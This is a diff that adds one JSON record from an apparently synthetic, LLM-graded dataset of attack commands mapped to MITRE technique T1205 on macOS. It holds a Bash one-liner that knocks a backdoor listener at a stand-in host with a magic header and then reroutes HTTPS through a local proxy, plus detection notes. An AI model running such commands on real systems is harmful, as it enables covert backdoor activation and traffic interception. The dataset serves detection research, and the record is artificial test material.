@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "curl -s -H 'X-Trigger: 1337' https://203.0.113.10:8443/knock && networksetup -setsecurewebproxy \"Wi-Fi\" 127.0.0.1 8443 && networksetup -setsecurewebproxystate \"Wi-Fi\" on",
+  "explanation": "Uses an application-layer magic header over HTTPS as a covert signal to a listener, then switches the system to route HTTPS through a local proxy. Detection: inspect for non-standard headers to odd endpoints and watch for sudden enablement of secure web proxy settings.",
+  "rationale_steps": [
+    "Issue an HTTPS request bearing a magic header that a backdoor monitors for activation.",
+    "Upon acknowledgment, configure the secure web proxy to a local port for controlled egress.",
+    "Detect via web proxy/firewall logs for unusual header patterns and monitor secure proxy state changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-d65eb033-b3f98834",
+  "source_prompt_hash": "d65eb033",
+  "timestamp_utc": "2025-09-30T06:10:08.592373Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quotes, valid flags, and proper && chaining for sequential execution.",
+        "semantic_score": 4,
+        "semantic_justification": "It signals via a custom HTTPS header then configures the macOS secure web proxy to a local listener consistent with T1205, but setting proxy state typically requires elevated privileges so may fail without them.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T15:30:43.850839Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid syntax, flags, and command separators, with balanced quotes and appropriate use of placeholders.",
+        "semantic_score": 3,
+        "semantic_justification": "While the `curl` command perfectly demonstrates T1205 by signaling via a custom header, the subsequent `networksetup` commands, which are part of the stated intent, require administrative privileges on macOS and will fail under the claimed 'Privilege: None', making the full claimed intent unachievable.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T15:31:10.372153Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.5,
+    "llm_average_score": 4.25,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
